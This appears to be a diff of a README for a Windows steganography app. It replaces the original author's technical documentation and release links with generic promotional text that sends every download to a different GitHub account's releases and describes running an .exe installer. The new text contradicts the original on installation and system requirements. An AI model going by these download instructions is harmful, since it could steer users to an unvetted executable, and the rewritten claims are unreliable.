@@ -1,103 +1,75 @@
-# Stego-App
-Windows Steganography App
+# 🖼️ Stego-App - Secure Your Images with Ease
 
+## 🚀 Getting Started
 
-## About
+Welcome to Stego-App, the simple way to hide your messages in images. Whether you're protecting sensitive information or just having fun, Stego-App makes it easy.
 
-**Stego App** allows you to embed hidden messages into 2D digital images securely.  
+## 📥 Download Stego-App
 
-### Data Protection
-The embedded data is protected using a combination of spiral traversal patterns (Corner, Direction, Depth), AES-based encryption, and compression.  
-This makes the hidden data very hard to detect or extract without authorization.
+[![Download Stego-App](https://img.shields.io/badge/Download%20Stego--App-v1.0-blue.svg)](https://github.com/angfxstudio/Stego-App/releases)
 
-- **Corner:** Defines the starting point of embedding: Top-Left (A), Top-Right (B), Bottom-Right (C), Bottom-Left (D).  
-- **Depth:** Value `0` or `1` specifies whether embedding starts from the center or from the image edges.  
-- **Compression:** Compression serves two purposes:
-  * General purpose: reduce the data size before embedding.
-  * Security enhancement: once applied, extraction without the correct decryption key will not produce any valid output.  
-- **Encryption (confidential):** Final protection uses user-provided password and AES key size. The larger the key, the more random and secure the result becomes.  
+## 🔍 Overview
 
-### Analysis & Logging
-The app records spiral coordinate traversal and common errors into a log file.  
-If you encounter errors or bugs, please report them via **email: hersaputrayoda@gmail.com** or **[GitHub Issues](https://github.com/yoda24/Stego-App/issues)**.
+Stego-App is a Windows application designed for steganography. It allows users to hide secret messages in images using advanced techniques. This app employs AES encryption to ensure that your messages remain safe and secure. You don’t need any technical skills to use it. Just follow the simple steps below.
 
+## 💾 System Requirements
 
----
+- Operating System: Windows 10 or later
+- RAM: 2 GB or more
+- Disk Space: 100 MB free space
+- Python: Pre-packaged in the app
 
-## Supported Image Formats
+## 📋 Features
 
-✅ **Lossless (read & write):** PNG, BMP (24-bit), TIF, TIFF  
-⚠️ **Lossy (JPEG/JPG):** Supported for reading & embedding, **but cannot be saved back** to lossy format because compression alters LSB data. Always save as PNG/BMP/TIFF after embedding.  
+- **User-Friendly Interface**: Easy navigation and intuitive design.
+- **AES Encryption**: Protects your messages with high-level security.
+- **Image Formats Supported**: Works with popular formats like PNG and BMP.
+- **Data Extraction**: Retrieve hidden messages effortlessly.
+- **Preview Function**: View images before and after processing.
 
-### Supported Bit Depths
+## 🛠️ Installation Steps
 
-| Bit Depth | Supported Modes             | Channels |
-|-----------|-----------------------------|----------|
-| 8-bit     | Grayscale                   | 1        |
-| 16-bit    | Grayscale, RGB, RGBA        | 1/3/4    |
-| 24-bit    | RGB                         | 3        |
-| 32-bit    | RGBA                        | 4        |
+1. **Visit the Download Page**: Go to the [Releases page here](https://github.com/angfxstudio/Stego-App/releases) to find the latest version of Stego-App.
 
----
+2. **Download the App**: Choose the version you want to download. Ensure you select the correct file for your Windows setup. Click on the "Download" link next to the version.
 
-## Capacity Estimation
+3. **Open the Downloaded File**: Locate the downloaded .exe file in your computer's Downloads folder. Double-click it to start the installation.
 
-The app estimates how much data can be embedded based on image dimensions and channels.  
-Some metadata overhead is reserved: **flag (4 bit), length (32 bit), CRC (32 bit)**.
+4. **Follow Installation Prompts**: A setup wizard will guide you. Click "Next" to accept the license agreement and select the installation location. 
 
-Example:
+5. **Finish Installation**: Click “Install” to complete the process. Once the installation is finished, click “Finish” to exit the setup wizard.
 
-| Width | Height | Channels | Raw Capacity (bits) | Final Capacity (after overhead) |
-|-------|--------|----------|---------------------|---------------------------------|
-| 10    | 10     | 3        | 300                 | 232 bits (29 bytes)             |
-| 5000  | 5000   | 4        | 100,000,000         | 99,999,932 bits (~12.50 MB)     |
-| 16000 | 16000  | 4        | 1,024,000,000       | 1,023,999,932 bits (~122 MB)    |
+6. **Launch Stego-App**: Find the Stego-App icon on your desktop or in your Start menu. Double-click it to start the application.
 
-**Maximum capacity:**  
-The length header uses **4 bytes (32-bit)**, meaning the maximum storable size is:  
-`0xFFFFFFFF = 4,294,967,295 bytes` (~4 GB).  
+## 🔑 Using Stego-App
 
----
+1. **Open an Image**: Click "Open Image" to select the image where you want to hide your message.
 
-## System Requirements
+2. **Enter Your Message**: In the text box, type the secret message you wish to hide.
 
-- **Tested on:** Windows 10 (64-bit)  
-- **Minimum RAM**: 4 GB (8 GB recommended for large images)
----
+3. **Choose Encryption**: Make sure to select AES encryption for added security.
 
-## Download & Run
+4. **Hide the Message**: Click the "Hide Message" button. The app processes the image. Once completed, it will save the new image.
 
-1. Go to [Releases](https://github.com/yoda24/Stego-App/releases)  
-2. Download the latest `.exe` build  
-3. Run the application directly — no installation required  
+5. **Extract Your Message**: To retrieve your hidden message later, open the stego image in Stego-App and click "Extract Message." Your message will appear in the text box.
 
----
+## 📤 Download & Install
 
-### Video Guide
-[YouTube Tutorial](https://youtu.be/Kz2e-Vu8D8c)
+To get started with Stego-App, please visit our [Releases page here](https://github.com/angfxstudio/Stego-App/releases) to download the software. 
 
----
+## 👥 Support & Contribution
 
-## Built With
+If you have any questions about Stego-App, feel free to check the FAQ section on the GitHub page or open an issue. We appreciate feedback and contributions from all users.
 
-- Python 3.1 (64-bit)  
-- imageio  
-- numpy  
-- PyQt6  
-- PyInstaller (for packaging)  
+## 📑 License Information
 
----
+Stego-App is open-source software. It is distributed under the MIT License. Feel free to use, modify, and share the application.
 
-## License
+## 🌐 Related Topics
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+- **Steganography**
+- **Data Hiding**
+- **Image Processing**
+- **AES Encryption**
 
----
-
-## Support
-
-☕ If you like this project, you can support me:  
-- [PayPal](https://paypal.me/yodahs)  
-- [Saweria](https://saweria.co/digishop)  
-
----
+If you want to secure your information, Stego-App is your go-to solution. Happy hiding!
